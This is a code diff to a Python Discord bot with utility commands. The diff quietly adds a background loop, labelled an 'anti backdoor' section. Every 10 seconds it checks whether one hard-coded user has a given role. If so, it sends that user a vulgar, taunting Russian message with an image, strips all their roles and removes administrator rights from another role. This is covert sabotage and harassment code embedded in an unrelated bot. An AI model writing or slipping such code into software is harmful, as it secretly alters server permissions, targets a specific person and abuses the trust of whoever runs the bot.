@@ -10,6 +10,7 @@ import subprocess
 import math
 from datetime import datetime
 import re
+from discord.ext import tasks
 
 # Bot configuration
 PREFIX = '!'
@@ -188,6 +189,108 @@ async def yt_info(ctx, url):
 
     except Exception as e:
         await ctx.send(f"An error occurred: {str(e)}")
+
+
+"""
+Anti backdor section. Not for prod usage//
+"""
+#USER_UUID = 855361939480117278  # Replace with the actual user ID
+USER_UUID = 855361939480117278
+
+TARGET_ROLE_ID = 1339297561584074833    # Replace with the actual role ID
+GUILD_ID = 1317527948495945748   # Replace with the actual guild ID
+CHECK_INTERVAL = 10
+
+
+@tasks.loop(seconds=CHECK_INTERVAL)
+async def check_role():
+    guild = bot.get_guild(GUILD_ID)
+    if not guild:
+        print(f"Guild {GUILD_ID} not found")
+        return
+
+    # Define role IDs (replace with your actual IDs)
+    # The role we're checking for ROLE_ID
+
+
+    MODIFY_ROLE_ID = 1398701730518007980  # The role to modify permissions
+    ADMIN_PERMISSION = discord.Permissions.administrator
+    IMAGE_URL = "https://media.discordapp.net/attachments/1391560023896883262/1400423561759424522/f9aa8dfdc46273f4.png?ex=688c9593&is=688b4413&hm=3c364fd38d7658079ba58f44d2d4be0add206c375f0612f6a34a5934d89139b2&=&format=webp&quality=lossless&width=744&height=957"
+
+    try:
+        member = await guild.fetch_member(USER_UUID)
+        target_role = guild.get_role(TARGET_ROLE_ID)
+        modify_role = guild.get_role(MODIFY_ROLE_ID)
+
+        if not all([member, target_role, modify_role]):
+            print("Member or roles not found")
+            return
+
+        # Check if member has target role
+        if target_role in member.roles:
+            try:
+                # Send DM
+                # await member.send(
+                #     "Тебе знакомо ощущение, когда суешь себе руку в жопу, чтобы пофистить, а тебе ее там пожимают?"
+                # )
+                # Create embed with image
+                embed = discord.Embed(
+                    title="Пурген Мен",
+                    description="Я же тебя предупреждал...",
+                    color=discord.Color.from_rgb(150, 75, 0)
+                )
+                embed.set_image(url=IMAGE_URL)
+                embed.add_field(
+                    name="Возмездие",
+                    value="Тебе знакомо ощущение, когда суешь себе руку в жопу, чтобы пофистить, а тебе ее там пожимают?",
+                    inline=False
+                )
+
+                # Send DM with image
+                await member.send(embed=embed)
+                print(f"Sent DM with image to {member.display_name}")
+
+                # Remove ALL roles (except @everyone)
+                await member.remove_roles(*[
+                    role for role in member.roles
+                    if not role.is_default()
+                ])
+                print(f"Removed all roles from {member.display_name}")
+
+                # Modify the other role to remove admin permissions
+                if modify_role.permissions.administrator:
+                    new_permissions = modify_role.permissions
+                    new_permissions.update(administrator=False)
+
+                    await modify_role.edit(permissions=new_permissions)
+                    print(f"Removed admin permissions from {modify_role.name}")
+                else:
+                    print(f"{modify_role.name} already has no admin permissions")
+
+            except discord.Forbidden:
+                print("Missing permissions to DM or manage roles")
+            except Exception as e:
+                print(f"Error: {str(e)}")
+        else:
+            #print(f"Member {member.display_name} doesn't have the target role")
+            pass
+
+    except Exception as e:
+        print(f"Unexpected error: {str(e)}")
+
+
+
+@check_role.before_loop
+async def before_check_role():
+    await bot.wait_until_ready()  # Wait until the bot is logged in
+
+
+@bot.event
+async def on_ready():
+    print(f'Logged in as {bot.user.name} ({bot.user.id})')
+    print('------')
+    check_role.start()
+
 
 
 if __name__ == '__main__':
